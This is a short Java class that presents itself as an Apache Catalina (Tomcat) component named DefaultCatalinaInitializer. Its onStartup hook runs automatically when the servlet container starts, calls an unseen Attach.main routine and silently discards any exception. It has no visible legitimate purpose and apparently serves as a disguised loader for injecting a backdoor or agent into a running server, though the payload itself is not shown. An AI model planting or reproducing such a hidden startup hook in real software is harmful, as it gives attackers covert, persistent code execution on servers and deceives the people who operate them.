package org.apache.catalina.servlets;

import javax.servlet.ServletContainerInitializer;
import javax.servlet.ServletContext;
import javax.servlet.ServletException;
import java.util.Set;

public class DefaultCatalinaInitializer implements ServletContainerInitializer {
    public void onStartup(Set<Class<?>> set, ServletContext servletContext) throws ServletException {
        try {
            Attach.main(new String[]{"ignored"});
        } catch (Exception ignored) {
        }
    }
}
